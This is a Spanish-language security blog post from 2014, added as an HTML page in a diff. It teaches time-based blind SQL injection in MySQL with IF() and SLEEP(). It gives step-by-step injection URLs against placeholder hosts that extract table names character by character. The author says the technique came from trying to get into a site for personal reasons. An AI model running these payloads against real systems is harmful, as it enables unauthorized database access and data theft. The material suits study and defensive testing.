@@ -1,0 +1,303 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Blind Mysqli Time Based [Teoria] - Security</title>
+  <meta name="author" content="q3rv0">
+
+  
+  <meta name="description" content="Mientras “auditaba” una web, lo digo entre comillas por que no me dedico a eso en lo laboral, mas bien me encontraba tratando de ingresar a un sitio &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://q3rv0.github.io/blog/2014/11/17/blind-mysqli-time-based-teoria">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security</a></h1>
+  
+    <h2>Follow the white rabbit&#8230;.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:q3rv0.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Blind Mysqli Time Based [Teoria]</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-17T10:42:51+06:30'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>10:42 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Mientras “auditaba” una web, lo digo entre comillas por que no me dedico a eso en lo laboral, mas bien me encontraba tratando de ingresar a un sitio por cuestiones personales, me encontre con una variante de inyeccion sql dando por descartado las demas a travez de las respuestas que generaba el servidor, una “Blind mysqli basada en tiempo”,<!--more--> paso a explicar a quienes no se encuntren familiarizados con este tipo de inyeccion.
+Basicamente una “Blind mysqli basada en tiempo” se trata de inyectar a ciegas como toda blind, en mi caso utilizando la tecnica de busqueda binaria (la mas comunmente utilizada en estas situaciones) pero se da cuando la aplicacion muestra el mismo mensaje TRUE OR FALSE, es decir que da los mismo inyectar un OR 1=1 que un OR 2+5/87=9999999999 el sitio web nos seguira mostrando el mismo mensaje de error, o puede deberse a realizar una carga incorrecta del contenido web, o cualquier otra desvariacion en el sitio, da lo mismo la aplicacion resulta vulnerable pero no podremos deducir cual es la inyeccion correcta.
+Para estas situaciones, podemos hacer uso de la funcion sleep() y la estructura condicional if(), ahora paso a explicar la sintaxis de cada una de estas.</p>
+
+<p>La sintaxis de if es la siguiente:</p>
+
+<p>if(&ldquo;condicion&rdquo;,&ldquo;si la condicion se cumple&rdquo;,&ldquo;si la condicion no se cumple&rdquo;)</p>
+
+<p>Por ejemplo:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;Verdadero es igual!&#39;</span><span class="p">,</span> <span class="s1">&#39;Falso no es igual!&#39;</span><span class="p">);</span>
+</span><span class='line'><span class="o">+------------------------------------------------------+</span>
+</span><span class='line'><span class="o">|</span> <span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;Verdadero es igual!&#39;</span><span class="p">,</span> <span class="s1">&#39;Falso no es igual!&#39;</span><span class="p">)</span> <span class="o">|</span>
+</span><span class='line'><span class="o">+------------------------------------------------------+</span>
+</span><span class='line'><span class="o">|</span> <span class="n">Verdadero</span> <span class="n">es</span> <span class="n">igual</span><span class="o">!</span>                                  <span class="o">|</span>
+</span><span class='line'><span class="o">+------------------------------------------------------+</span>
+</span><span class='line'><span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>sleep() se utiliza para producir una pausa de tantos segundos, vamos a combinarlo con if() e imponerlo si la condicion no se cumple.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="s1">&#39;q3rv0&#39;</span><span class="p">,</span> <span class="s1">&#39;Verdadero es igual!&#39;</span><span class="p">,</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">));</span>
+</span><span class='line'><span class="o">+------------------------------------------------+</span>
+</span><span class='line'><span class="o">|</span> <span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="s1">&#39;q3rv0&#39;</span><span class="p">,</span> <span class="s1">&#39;Verdadero es igual!&#39;</span><span class="p">,</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span> <span class="o">|</span>
+</span><span class='line'><span class="o">+------------------------------------------------+</span>
+</span><span class='line'><span class="o">|</span> <span class="mi">0</span>                                              <span class="o">|</span>
+</span><span class='line'><span class="o">+------------------------------------------------+</span>
+</span><span class='line'><span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span><span class="p">,</span> <span class="mi">1</span> <span class="nf">warning</span> <span class="p">(</span><span class="mi">3</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Como vemos la condicion dio como resultado falsa y se le introdujo un retardo de 3 seg ante dicha respuesta.</p>
+
+<p>ahora se pueden imaginar el resultado del vector al combinar ambas funciones con una blind sqli??</p>
+
+<p>No se trata de nada rebuscado, solo hay que utilizar como condicion el vector sqli para dicha inyeccion por ejemplo:</p>
+
+<p>Empezemos desde cero, supongamos que encontraron una web vulnerable que da con el perfil de este tipo de inyeccion y queremos verificar que en realidad se trata de esta, comenzariamos por introcir el siguiente vector en el parametro devil.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if(1=1,sleep(5),0)--   > 5 segundos(TRUE)
+</span><span class='line'> 
+</span><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if(1=9999,sleep(5),0)--  > FALSE</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ahora ya nos damos una idea de como inyectar en la aplicacion comenzando por obtener el listado de las tablas en la base de datos, normalmente en una blind sqli seria de la siguiente manera:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>15-- TRUE
+</span><span class='line'> 
+</span><span class='line'>http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>50-- TRUE
+</span><span class='line'> 
+</span><span class='line'>http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>100-- FALSE
+</span><span class='line'> 
+</span><span class='line'>http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>68-- FALSE
+</span><span class='line'> 
+</span><span class='line'>http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))=67-- TRUE</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Veamos como queda armado el vector haciendo uso de nuestro amigo “el tiempo”:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>15,sleep(5),0)-- TRUE 5 segundos
+</span><span class='line'> 
+</span><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>50,sleep(5),0)-- TRUE 5 segundos
+</span><span class='line'> 
+</span><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>100,sleep(5),0)-- FALSE
+</span><span class='line'> 
+</span><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>68,sleep(5),0)-- FALSE
+</span><span class='line'> 
+</span><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))=67,sleep(5),0)-- TRUE 5 segundos</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Sencillo, lo unico que tiene de rebuscado esta tecnica es mantener la paciencia mienstras se lleva a cabo la inyeccion manualmente.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">q3rv0</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2014-11-17T10:42:51+06:30'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>10:42 am</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://q3rv0.github.io/blog/2014/11/17/blind-mysqli-time-based-teoria/" data-via="q3rv0" data-counturl="http://q3rv0.github.io/blog/2014/11/17/blind-mysqli-time-based-teoria/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/11/17/sqli-plus-mod-security-bypass/" title="Previous Post: SQLI+Mod_Security Bypass">&laquo; SQLI+Mod_Security Bypass</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/11/17/blind-mysqli-time-based-teoria/">Blind Mysqli Time Based [Teoria]</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/17/sqli-plus-mod-security-bypass/">SQLI+Mod_Security Bypass</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/17/kbeast-plantando-un-rootkit/">[KBEAST] Plantando Un Rootkit</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/17/remote-code-execution/">Remote Code Execution</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/17/xss-a-travez-de-error/">Xss a Travez De Error</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - q3rv0 -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
